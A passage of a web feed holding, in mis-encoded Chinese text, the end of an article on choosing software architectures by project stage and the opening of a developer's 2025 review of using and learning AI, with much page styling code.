<li>äº‹ä»¶é©±åŠ¨å‹ä»»åŠ¡ï¼ˆæ–‡ä»¶ä¸Šä¼ ã€æ¶ˆæ¯æ¶ˆè´¹ã€å®šæ—¶ä»»åŠ¡ï¼‰</li>
<li>ä¸€äº›è¾¹ç¼˜é€»è¾‘ï¼ˆå¦‚æ´»åŠ¨é¡µæ¥å£ã€Webhook å¤„ç†å™¨ï¼‰</li>
<li>ä¸šåŠ¡æµé‡å³°è°·å˜åŒ–å¾ˆå¤§çš„åœºæ™¯</li>
</ul>
</li>
</ul>
<p>ä½†è¦æ³¨æ„ï¼š</p>
<ul>
<li>å­˜åœ¨â€œå†·å¯åŠ¨â€é—®é¢˜ï¼Œé¦–æ¬¡è°ƒç”¨å¯èƒ½æœ‰æ˜æ˜¾å»¶è¿Ÿ</li>
<li>æœ‰è¾ƒå¼ºçš„å‚å•†ç»‘å®šï¼Œè¿ç§»æˆæœ¬é«˜</li>
<li>æ¶æ„ä¸Šå¿…é¡»éå¸¸æ³¨æ„<strong>çŠ¶æ€å¤–ç½®</strong>ï¼ˆæ•°æ®åº“ã€ç¼“å­˜ã€å¯¹è±¡å­˜å‚¨ï¼‰</li>
</ul>
<p>åœ¨ç°ä»£ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªæ¯”è¾ƒç†æƒ³çš„ç»„åˆæ˜¯ï¼š<br/>
<strong>æ ¸å¿ƒä¸šåŠ¡ç”¨â€œæ•´æ´å•ä½“æˆ–å¾®æœåŠ¡â€æ‰¿è½½ï¼›å¤§é‡è¾¹ç¼˜åŠŸèƒ½ç”¨ Serverless æ‰¿æ¥</strong>ï¼Œè¾¾æˆæˆæœ¬ã€å¼¹æ€§å’Œå¤æ‚åº¦çš„å¹³è¡¡ã€‚</p>
<hr/>
<h2 data-id="heading-12">å…«ã€å¦‚ä½•æ ¹æ®é¡¹ç›®é˜¶æ®µé€‰æ‹©åˆé€‚æ¶æ„ï¼ˆå¯æ“ä½œå»ºè®®ï¼‰</h2>
<p>ç»“åˆä¸Šé¢è¿™äº›æ¨¡å¼ï¼Œå¯ä»¥ç»™å‡ºä¸€ä¸ªåâ€œè½åœ°â€çš„é€‰å‹æ¡†æ¶ã€‚ä½ å¯ä»¥ç²—ç•¥å¯¹ç…§è‡ªå·±çš„é¡¹ç›®ï¼Œçœ‹çœ‹æ›´é€‚åˆå“ªæ¡è·¯çº¿ã€‚</p>
<h3 data-id="heading-13">1. åˆåˆ›æˆ–ä¸­å°é¡¹ç›®ï¼ˆå•å›¢é˜Ÿã€éœ€æ±‚æ¨¡ç³Šï¼‰</h3>
<p><strong>æ¨èï¼š</strong></p>
<ul>
<li>æŠ€æœ¯å½¢æ€ï¼šB/S + åˆ†å±‚å•ä½“</li>
<li>ç»„ç»‡æ–¹å¼ï¼šæŒ‰ä¸šåŠ¡é¢†åŸŸåšæ¨¡å—åˆ’åˆ†ï¼ˆå‚ç›´åˆ‡ç‰‡ï¼‰</li>
<li>æ¶æ„åŸåˆ™ï¼šå°½é‡åº”ç”¨ Clean Architecture æ€æƒ³ï¼Œç¡®ä¿ä¸šåŠ¡é€»è¾‘ä¸æ¡†æ¶è§£è€¦</li>
</ul>
<p><strong>é‡ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸è¦è¿‡æ—©ä¸Šå¾®æœåŠ¡ï¼Œä¸è¦ä¸ºå°šä¸å­˜åœ¨çš„å¤æ‚æ€§ä¹°å•</li>
<li>ç”¨æ¸…æ™°çš„ä»£ç ç»“æ„ã€è‡ªåŠ¨åŒ–æµ‹è¯•å’Œè§„èŒƒçš„æ¥å£è®¾è®¡æ¥â€œé¢„é˜²æœªæ¥çš„è…åŒ–â€</li>
</ul>
<h3 data-id="heading-14">2. ä¸šåŠ¡é€æ¸å¤æ‚ã€å›¢é˜Ÿå¼€å§‹åˆ†æ‹†</h3>
<p><strong>å¯ä»¥å¼•å…¥ï¼š</strong></p>
<ul>
<li>é¢†åŸŸé©±åŠ¨è®¾è®¡ï¼ˆDDDï¼‰çš„åŸºç¡€æ¦‚å¿µï¼šé¢†åŸŸã€èšåˆã€é™ç•Œä¸Šä¸‹æ–‡</li>
<li>å±€éƒ¨é‡‡ç”¨äº‹ä»¶é©±åŠ¨ï¼ˆEDAï¼‰ä¼˜åŒ–è§£è€¦ä¸å¼‚æ­¥å¤„ç†</li>
<li>å¯¹æŸå‡ ä¸ªâ€œè¯»å‹åŠ›å·¨å¤§â€çš„åŠŸèƒ½ä½¿ç”¨ CQRS åšè¯»å†™åˆ†ç¦»</li>
</ul>
<p><strong>æ­¤é˜¶æ®µç›®æ ‡ï¼š</strong></p>
<ul>
<li>åœ¨ä¿æŒå•ä½“éƒ¨ç½²çš„å‰æä¸‹ï¼Œå…ˆæŠŠâ€œæ¶æ„å†…åŠŸâ€ç»ƒæ‰å®</li>
<li>é€šè¿‡æ¸…æ™°é¢†åŸŸè¾¹ç•Œï¼Œä¸ºæœªæ¥çš„å¾®æœåŠ¡æ‹†åˆ†æ‰“ä¸‹åŸºç¡€</li>
</ul>
<h3 data-id="heading-15">3. å¤šå›¢é˜Ÿã€å¤šä¸šåŠ¡çº¿ã€é«˜å¹¶å‘è¦æ±‚</h3>
<p><strong>å¯ä»¥æ¸è¿›å¼å¼•å…¥ï¼š</strong></p>
<ul>
<li>å¾®æœåŠ¡æ¶æ„ï¼šä»æœ€ç‹¬ç«‹ã€æœ€ç¨³å®šçš„é¢†åŸŸå¼€å§‹æ‹†åˆ†ï¼ˆå¦‚ç”¨æˆ·ã€è´¦åŠ¡ã€é€šçŸ¥ï¼‰</li>
<li>API ç½‘å…³ã€æœåŠ¡æ³¨å†Œå‘ç°ã€é…ç½®ä¸­å¿ƒã€é“¾è·¯è¿½è¸ªç­‰é…å¥—è®¾æ–½</li>
<li>æœåŠ¡ç½‘æ ¼ç”¨äºç»Ÿä¸€æ²»ç†è°ƒç”¨ã€æµé‡ä¸å®‰å…¨</li>
</ul>
<p><strong>åŒæ—¶ï¼š</strong></p>
<ul>
<li>å¯¹å…³é”®ä¸šåŠ¡é“¾è·¯å¯ä»¥å åŠ äº‹ä»¶é©±åŠ¨æ¶æ„ï¼Œç®€åŒ–è€¦åˆã€æå‡æ‰©å±•æ€§</li>
<li>åœ¨äº¤æ˜“ã€é£æ§ã€æŠ¥è¡¨ç­‰å¤æ‚åœºæ™¯å¼•å…¥ CQRS + äº‹ä»¶æº¯æºï¼ˆè§†ä¸šåŠ¡å¤æ‚åº¦é€‰æ‹©ï¼‰</li>
</ul>
<h3 data-id="heading-16">4. å¤§è§„æ¨¡äº‘åŸç”Ÿä¸æˆæœ¬ä¼˜åŒ–é˜¶æ®µ</h3>
<p>åœ¨å·²ç»ç¨³å®šè¿è¥çš„å¾®æœåŠ¡ä½“ç³»ä¹‹ä¸Šï¼Œå†å¼•å…¥ï¼š</p>
<ul>
<li>Serverless æ‰¿æ¥é›¶æ•£ã€æ³¢åŠ¨å¤§çš„è¾¹ç¼˜ä»»åŠ¡</li>
<li>åœ¨è¾¹ç¼˜èŠ‚ç‚¹éƒ¨ç½²éƒ¨åˆ†æœåŠ¡ï¼Œé™ä½å»¶è¿Ÿ</li>
<li>ä½¿ç”¨åŸºç¡€è®¾æ–½å³ä»£ç ï¼ˆIaCï¼‰ã€GitOps ç­‰ç®¡ç†å¤§è§„æ¨¡ç¯å¢ƒ</li>
</ul>
<hr/>
<h2 data-id="heading-17">ä¹ã€æ€»ç»“ï¼šæ¶æ„çš„ä»·å€¼ï¼Œä¸åœ¨â€œå¤šé«˜çº§â€ï¼Œè€Œåœ¨â€œå¤šé€‚åˆâ€</h2>
<p>å¦‚æœç”¨ä¸€å¥è¯æ¥æ¦‚æ‹¬ä¸Šé¢çš„å†…å®¹ï¼š</p>
<blockquote>
<p>æ¶æ„ä¸æ˜¯ç‚«æŠ€ï¼Œè€Œæ˜¯è®©ä¸šåŠ¡<strong>ä»¥æœ€å°çš„å¿ƒæ™ºå’Œè¿ç»´æˆæœ¬ï¼Œè·å¾—è¶³å¤Ÿçš„çµæ´»æ€§ã€æ€§èƒ½å’Œå¯é æ€§</strong>ã€‚</p>
</blockquote>
<p>å› æ­¤ï¼š</p>
<ul>
<li><strong>ä¸è¦å› ä¸ºâ€œæµè¡Œâ€è€Œä¸Šå¾®æœåŠ¡ã€CQRSã€Serverless</strong>ï¼Œè€Œè¦å› ä¸ºâ€œé‡åˆ°äº†å®ƒæ‰€è§£å†³çš„é—®é¢˜â€</li>
<li><strong>å•ä½“å¹¶ä¸ä½çº§</strong>ï¼Œä¸€ä¸ªåšå¥½äº†é¢†åŸŸåˆ’åˆ†ä¸æ•´æ´è®¾è®¡çš„å•ä½“ï¼Œæ˜¯å¤šæ•°å›¢é˜Ÿæœ€å…·æ€§ä»·æ¯”çš„é€‰æ‹©</li>
<li><strong>æ¶æ„ä¸æ˜¯ä¸€é”¤å­ä¹°å–ï¼Œè€Œæ˜¯ä¸€æ¡æ¼”è¿›è·¯å¾„</strong>ï¼šä»æ•´æ´å•ä½“ â†’ æ¨¡å—åŒ–å•ä½“ â†’ æ¸è¿›å¼å¾®æœåŠ¡ â†’ äº‘åŸç”Ÿ &amp; Serverless</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025ï¼šä»ç”¨ AI åˆ°å­¦ AIï¼Œæˆ‘æœ€è½»æ¾ä¹Ÿæœ€å¿™ç¢Œçš„ä¸€å¹´]]></title>    <link>https://juejin.cn/post/7592452108798181419</link>    <guid>https://juejin.cn/post/7592452108798181419</guid>    <pubDate>2026-01-08T01:50:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592452108798181419" data-draft-id="7592134330313064491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025ï¼šä»ç”¨ AI åˆ°å­¦ AIï¼Œæˆ‘æœ€è½»æ¾ä¹Ÿæœ€å¿™ç¢Œçš„ä¸€å¹´"/> <meta itemprop="keywords" content="åç«¯,äººå·¥æ™ºèƒ½,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T01:50:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ´›å¡å¡äº†"/> <meta itemprop="url" content="https://juejin.cn/user/888839672963544"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025ï¼šä»ç”¨ AI åˆ°å­¦ AIï¼Œæˆ‘æœ€è½»æ¾ä¹Ÿæœ€å¿™ç¢Œçš„ä¸€å¹´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/888839672963544/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ´›å¡å¡äº†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:50:05.000Z" title="Thu Jan 08 2026 01:50:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h3 data-id="heading-0">ä¸€ Â· 2025ï¼šæˆ‘è¢« AI æ¨ç€å¾€å‰èµ°çš„ä¸€å¹´</h3>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å¡å¡ã€‚ æˆ‘å…¶å®ä¸€ç›´æ²¡æœ‰å†™ä¸ªäººæ€»ç»“çš„ä¹ æƒ¯ï¼Œå› ä¸ºå¾ˆå¤šæ—¶å€™æˆ‘éƒ½ä¼šè§‰å¾—ï¼Œè‡ªå·±çš„äººç”Ÿæ˜¯å¾ˆæ— è¶£çš„ã€‚å¥½åƒå°±æ˜¯æŠŠåŒä¸€å¤©é‡å¤è¿‡äº† 365 éã€‚æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«å¤§çš„æƒŠå–œï¼Œä¹Ÿè°ˆä¸ä¸Šæœ‰ä»€ä¹ˆè´¨çš„æ”¹å˜ï¼Œå”¯ä¸€ä¸€ç›´åœ¨å¾€å‰èµ°çš„ï¼Œå¯èƒ½å°±åªæœ‰å¹´é¾„äº†ã€‚ä¸è¿‡ä»Šå¹´æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œ2025 å¹´æ˜¯æˆ‘åœ¨æ˜é‡‘æœ€æ´»è·ƒçš„ä¸€å¹´ï¼Œè¿™æ¬¡ä¹Ÿç®—æ˜¯å€Ÿç€å¾æ–‡çš„æœºä¼šï¼Œå›å¤´è®°å½•ä¸€ä¸‹å±äºè‡ªå·±çš„è¿™ä¸€åœˆæ•°å­—å¹´è½®ã€‚</p>
<p>å¦‚æœè¦ç”¨ä¸€å¥è¯æ¥æ¦‚æ‹¬ 2025 å¹´ï¼Œé‚£å°±æ˜¯ï¼š<strong>è¿™æ˜¯æˆ‘ç¨‹åºå‘˜è¿‘å‡ å¹´ç”Ÿæ¶¯é‡Œæœ€è½»æ¾çš„ä¸€å¹´ï¼Œä¹Ÿæ˜¯æœ€å¿™ç¢Œçš„ä¸€å¹´ã€‚</strong> ä¸ŠåŠå¹´å¾ˆè½»æ¾ï¼Œä¸‹åŠå¹´å´å¼‚å¸¸å¿™ç¢Œï¼Œè€Œè¿™ä¸¤ç§çœ‹ä¼¼ç›¸åçš„çŠ¶æ€ï¼Œå…¶å®éƒ½ç¦»ä¸å¼€åŒä¸€ä¸ªå·¥å…·â€”â€”AIã€‚</p>
<p><strong>2025 å¹´ï¼Œæˆ‘ä¸€è¾¹è¢« AI è§£æ”¾ï¼ˆå·¥ä½œæ›´è½»æ¾ï¼‰ï¼Œä¸€è¾¹è¢« AI ç‰µå¼•ï¼ˆå­¦ä¹ æ›´å¿™ç¢Œï¼‰ã€‚</strong> ä»æœ€å¼€å§‹å•çº¯ç”¨ AI å†™ä»£ç ã€æŸ¥é—®é¢˜ã€æ”¹ bugï¼Œåˆ°åæ¥ä¸»åŠ¨å»å­¦ä¹  AIã€ç ”ç©¶å·¥ä½œæµã€æ­æµç¨‹ã€åšéªŒè¯ã€ä¸æ–­å°è¯•æ–°çš„æ–¹å‘ã€‚ å›å¤´çœ‹è¿™ä¸€å¹´ï¼Œæˆ‘ä¹Ÿç®—æ˜¯<strong>çœŸå®åœ°ä½“éªŒäº†ä¸€æŠŠè¢«æ—¶ä»£æ¨ç€å¾€å‰èµ°çš„æ„Ÿè§‰å§ã€‚</strong></p>
<hr/>
<h3 data-id="heading-1">äºŒ Â· å†™ä»£ç è¿™ä»¶äº‹ï¼Œå¼€å§‹å˜è½»æ¾äº†</h3>
